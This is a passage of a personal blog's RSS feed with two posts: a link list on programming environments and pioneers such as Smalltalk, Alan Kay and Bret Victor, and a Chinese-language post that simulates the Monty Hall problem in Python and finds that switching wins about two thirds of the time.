<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>writing for time</title><link>/</link><description></description><lastBuildDate>Sat, 13 Apr 2019 00:00:00 +0000</lastBuildDate><item><title>The future of coding</title><link>/The-future-of-coding.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/dynabook_3e211037.png" /&gt;&lt;/p&gt;
&lt;p&gt;"better old thing."&lt;/p&gt;
&lt;h1 id="programming-language-environment"&gt;Programming Language &amp;amp; Environment&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/LISP"&gt;LISP&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh/Scheme"&gt;Scheme&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/1632977/"&gt;The Little Schemer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://web.mit.edu/alexmv/6.037/sicp.pdf"&gt;SICP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-hans/Smalltalk"&gt;Smalltalk&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.squeakland.org/"&gt;Squeak&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Etoys_(programming_language)"&gt;Etoys&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://wiki.squeakland.org/index.php/LearningWithEtoysI3"&gt;Learning with Etoys - Imagine Invent Inspire&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pharo.org/"&gt;Pharo&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/SquareBracketAssociates/UpdatedPharoByExample"&gt;UpdatedPharoByExample&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/EarlyHistoryOfSmalltalk"&gt;The Early History Of Smalltalk&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Logo_(programming_language)"&gt;LOGO&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scratch.mit.edu/"&gt;Scratch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.lively-kernel.org/"&gt;lively-kernel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/project/gp/"&gt;GP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/project/realtalk/"&gt;realtalk&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="researcher"&gt;researcher&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Douglas_Engelbart"&gt;Douglas Engelbart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/John_McCarthy_(computer_scientist)"&gt;John McCarthy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Alan_Kay"&gt;Alan Kay&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ted.com/talks/alan_kay_shares_a_powerful_idea_about_ideas?language=zh-cn"&gt;a powerful idea about ideas&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/profile/Alan-Kay-11"&gt;Alan Kay in Quora&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Seymour_Papert"&gt;Seymour Papert&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/refs/Papert%20-%20Mindstorms%201st%20ed.pdf"&gt;Mindstorms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Dan_Ingalls"&gt;Dan Ingalls&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Adele_Goldberg_(computer_scientist)"&gt;Adele Goldberg&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Bret_Victor"&gt;Bret Victor&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/"&gt;worrydream.com&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/#!/LearnableProgramming"&gt;LEARNABLE PROGRAMMING&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/KillMath/"&gt;Kill Math&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/#!/InventingOnPrinciple"&gt;InventingOnPrinciple&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Mitchel_Resnick"&gt;Mitchel Resnick&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://mitpress.mit.edu/books/lifelong-kindergarten"&gt;Lifelong Kindergarten: Cultivating Creativity through Projects, Passion, Peers, and Play&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ted.com/talks/mitch_resnick_let_s_teach_kids_to_code"&gt;let's teach kids to code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="projects"&gt;Projects&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/project/tutoring-system/"&gt;Tutoring System&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.vpri.org/pdf/tr2016002_tutor.pdf"&gt;Towards Making a Computer Tutor for Children of All Ages&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dynamicland.org/"&gt;Dynamicland&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/project/apparatus/"&gt;Apparatus&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://aprt.us/"&gt;Read more&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="organization"&gt;organization&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/PARC_(company)"&gt;Xerox PARC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dynamicland.org/"&gt;Dynamicland&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.media.mit.edu/groups/lifelong-kindergarten/overview/"&gt;Lifelong Kindergarten&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cdglabs.org/"&gt;CDG&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/"&gt;HARC&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://harc.ycr.org/member/"&gt;members&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="reading-list"&gt;Reading List&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.squeakland.org/resources/books/readingList.jsp"&gt;Alan Kay's Reading List&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://worrydream.com/#!/Links"&gt;Bret Victor’s reading list&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/nickloewen/10565777"&gt;plain-text version&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 13 Apr 2019 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2019-04-13:The-future-of-coding.html</guid><category>coding</category></item><item><title>三门问题的程序模拟</title><link>/Monty-Hall-problem-programming.html</link><description>&lt;blockquote&gt;
&lt;p&gt;衡量一种理论的科学地位的标准是它的可证伪性或可检验性。  -- 卡尔·波普尔&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/Monty_Hall_problem_4e9dcde0.png" /&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;昨天在北京，和CodeLab的两个志愿者沟通完之后，一看时间，距离飞机起飞还早。看了下地图，发现当前位置离北大不远，于是准备过去找@yuhao喝个下午茶，扯扯近况吐吐槽。&lt;/p&gt;
&lt;p&gt;后来接到@zichun信息说，系统的网络问题解决了，问是否有时间去实验室一趟，于是我就往北邮去了，跟@yuhao没碰上面。&lt;/p&gt;
&lt;p&gt;想起来上次和@yuhao在南京碰面，夜里找遍南京的角落，也没找到好吃的馄炖店(@yuhao是南京人，是南京几家馄炖店的铁粉)。找夜宵的路上聊了很多有趣的话题，其中一个是&lt;code&gt;三门问题&lt;/code&gt;。我记得我们当时观念分歧，谁也说服不了谁，最终沦为观念之争，因为没法做一万次实验来检验它。于是我上飞机前发信息给@yuhao说，还记得上次在南京吃夜宵聊的门后有羊的概率问题吗？我想到检验这个问题的方法了。&lt;/p&gt;
&lt;p&gt;在飞行途中，写了个简单的程序来模拟这个游戏。源码稍后放出，我们从问题说起。&lt;/p&gt;
&lt;h1 id="_2"&gt;三门问题&lt;/h1&gt;
&lt;p&gt;我最早听到&lt;code&gt;三门问题&lt;/code&gt;好像是在概率论课上，我挺喜欢这门课的，觉得概率论有时触及世界观，关于你如何看待外部物理世界。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;三门问题&lt;/code&gt;又叫&lt;code&gt;Monty Hall problem&lt;/code&gt;，来自于美国的一档电视节目:&lt;a href="https://en.wikipedia.org/wiki/Let%27s_Make_a_Deal"&gt;Let's Make a Deal&lt;/a&gt;, 由于&lt;a href="https://en.wikipedia.org/wiki/Monty_Hall"&gt;Monty Hall&lt;/a&gt;是节目的主持人，于是这个问题得名&lt;code&gt;Monty Hall problem&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这个问题最初是由&lt;a href="https://en.wikipedia.org/wiki/Steve_Selvin"&gt;Steve Selvin&lt;/a&gt;在1975年给美国统计学家的一封信中提出的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;三门问题&lt;/code&gt;可以表述为:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;假设你正在参加一档游戏节目，有三个门供你选择: 一扇门后面是一辆汽车; 其他两扇门的后边是山羊。你的目标是选中汽车。你选择了其中一扇门，比如说1号门。主持人知道三扇门的后边分别是什么。于是他打开了另一扇门(比如3号门)，你看到那里有一只山羊。接着主持人对你说："你要换选2号门吗？"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;那么问题来了，换一扇门对你有利吗？&lt;/p&gt;
&lt;h1 id="_3"&gt;观念之争&lt;/h1&gt;
&lt;p&gt;对这个问题，有3种意见在人群中比较典型。&lt;/p&gt;
&lt;p&gt;意见一认为&lt;code&gt;换不换无所谓&lt;/code&gt;，胜率都是&lt;code&gt;1/3&lt;/code&gt;，在游戏开始，每个选项胜率是&lt;code&gt;1/3&lt;/code&gt;。主持人排除余下两个选项中的一个错误选项之后，物理世界中没有任何事物发生变化，和初始状态完全相同。所以胜率还是&lt;code&gt;1/3&lt;/code&gt;。 无论如何，剩下的两个选项中，肯定有一个是错的，主持人只是帮你指出来，这又没改变什么。&lt;/p&gt;
&lt;p&gt;意义二认为&lt;code&gt;应该换2号门&lt;/code&gt;。意见二认为在游戏开始时，所做出的选择胜率为&lt;code&gt;1/3&lt;/code&gt;。换了2号门之后，等同于一开始同时选择了3号门和2号门，所以胜率变为&lt;code&gt;2/3&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;意见三也认为&lt;code&gt;换不换无所谓&lt;/code&gt;，但意见三认为，换不换的胜率都是&lt;code&gt;1/2&lt;/code&gt;，而不是&lt;code&gt;1/3&lt;/code&gt;, 因为主持人帮你排除了一个错误选项，于是问题被重置，成为2选一的问题。&lt;/p&gt;
&lt;!--指出一个必然的事实--&gt;

&lt;p&gt;在南京聊到这个问题时，@yuhao持意见三，我持意见二。&lt;/p&gt;
&lt;h1 id="_4"&gt;争论背后&lt;/h1&gt;
&lt;p&gt;相较于正确答案是什么，答案所依赖的思考逻辑更有意思。它取决于我们如何看待&lt;code&gt;信息&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这个问题触及信息与现实的关系。&lt;/p&gt;
&lt;h1 id="_5"&gt;程序模拟&lt;/h1&gt;
&lt;p&gt;我来给出程序模拟，看看检验的结果如何。思路是通过多次实验，计算频率来估计概率。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;

&lt;span class="n"&gt;user1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;yuhao&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;# 坚定不移, 打死不换答案，反正都胜率一样&lt;/span&gt;
&lt;span class="n"&gt;user2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;wenjie&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;# 摇摆不定, 看到有新的补充信息，就动摇了，还是换吧&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;make_a_choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;choices&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;car&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;goat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;goat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="c1"&gt;# 参与者随机作出一个选择&lt;/span&gt;
    &lt;span class="n"&gt;user_choice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_choice&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;# choices此时为剩余的两个选项&lt;/span&gt;
    &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;user1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# 第一类用户， 不换答案&lt;/span&gt;
        &lt;span class="k"&gt;pass&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;user2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# 第二类用户, 换答案&lt;/span&gt;
        &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;        # 模拟主持人的认知过程，掀开门看下是啥，直到看到是羊才展示&lt;/span&gt;
&lt;span class="sd"&gt;        while True:&lt;/span&gt;
&lt;span class="sd"&gt;            remove_choice = random.choice(choices)&lt;/span&gt;
&lt;span class="sd"&gt;            if remove_choice == &amp;quot;goat&amp;quot;:&lt;/span&gt;
&lt;span class="sd"&gt;                remove_choice = choices.remove(remove_choice)&lt;/span&gt;
&lt;span class="sd"&gt;                break&lt;/span&gt;
&lt;span class="sd"&gt;        &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;goat&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="c1"&gt;# 主持人排除完错误选项之后，只余下一个选项&lt;/span&gt;
        &lt;span class="k"&gt;assert&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
        &lt;span class="c1"&gt;# 参与者选择换选项&lt;/span&gt;
        &lt;span class="n"&gt;user_choice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;user_choice&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;car&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;is_car&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;is_car&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;is_car&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;game&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;times&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;score&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;# 得分&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;times&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;is_car&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;make_a_choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 反复进行多个回合，重复实验&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;is_car&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;score&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;score&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;times&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;100000&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;user1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user2&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;game start, user: {user}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;score&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;game&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;times&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;times&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;frequency&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;score&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;times&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;game end&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;user: {user}, times:{times}, score: {score}, score/times: {frequency}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序非常简单。&lt;/p&gt;
&lt;p&gt;运行的结果为:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/Monty_Hall_problem_fe09407f.png" /&gt;&lt;/p&gt;
&lt;p&gt;我总共做了4组实验，每组包含有100000次(10万次)模拟游戏。&lt;/p&gt;
&lt;p&gt;结论是: 选择换选项的胜率稳定在&lt;code&gt;2/3&lt;/code&gt;, 选择不换的胜率稳定在&lt;code&gt;1/3&lt;/code&gt;。尽管每次实验，略有差异，但在统计上基本稳定。&lt;/p&gt;
&lt;p&gt;程序中有没有可以质疑的地方呢？我觉得是有的。&lt;/p&gt;
&lt;h1 id="_6"&gt;猜想与反驳&lt;/h1&gt;
&lt;h3 id="_7"&gt;随机数&lt;/h3&gt;
&lt;p&gt;我们知道计算机的随机数并不是真的随机，是不是计算机产生随机数的机制有偏见，如果产生随机数的机制依据了统计学公式，那么产生的随机数一定满足统计学规律。 &lt;/p&gt;
&lt;p&gt;我们来试着排除这个影响。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;car&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;goat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;goat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;user_choice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这两行模拟了参与者的随机决策。怀疑论者会问，我们怎么知道&lt;code&gt;random.choice(choices)&lt;/code&gt;在选择的时候，不会与"car"在choices中的位置相关，毕竟我们不知道这里随机背后规则是什么。通过调整"car"的次序可以回答这个问题，位置对结果没有影响。&lt;/p&gt;
&lt;p&gt;怀疑论者会继续问，我们怎么知道&lt;code&gt;random.choice&lt;/code&gt;会不会偏好更长的字符串。这个问题其实也很容易做实验解决。&lt;/p&gt;
&lt;p&gt;怀疑论者常常能把我们带到远处。更有趣的问法是，我们知道计算机的随机数并不是随机产生的，所以它的统计学规律内在于它的产生机制中。我们会类比说，现实世界之所以出现稳定的统计规律，这种现象是不是揭示了宇宙里有某种硬编码的规则。&lt;/p&gt;
&lt;p&gt;统计规律的背后是空无一物还是有所支撑，这个问题完全变成形而上学问题了，多说无益。&lt;/p&gt;
&lt;h3 id="_8"&gt;主持人的决策&lt;/h3&gt;
&lt;p&gt;代码里还有一处值得关注。&lt;/p&gt;
&lt;p&gt;主持人是如何帮我们排除一个错误选项的呢？&lt;/p&gt;
&lt;p&gt;如果我们采用日常语言来描述&lt;code&gt;主持人帮我们排除一个错误选项&lt;/code&gt;这件事，我们会错过一个有趣的细节，这个细节我是在编程中才发现的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;主持人帮我们排除一个错误选项&lt;/code&gt;听起来不需要被特别关注，因为主持人知道什么是错误选项啊，所以他指出来就好了啊。当我们用日常语言表述这句话时，不会在此发生停留，因为它如此&lt;code&gt;自明&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当我们需要在程序中模拟主持人排除错误选项时，代码逼着我们使用明确的逻辑规则来描述。我给出了两个方案都能做到&lt;code&gt;排除一个错误选项&lt;/code&gt;，但注意它们是有区别的。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="c1"&gt;# 模拟主持人的认知过程，掀开门看下是啥，直到看到是羊才向选手展示&lt;/span&gt;
        &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;remove_choice&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
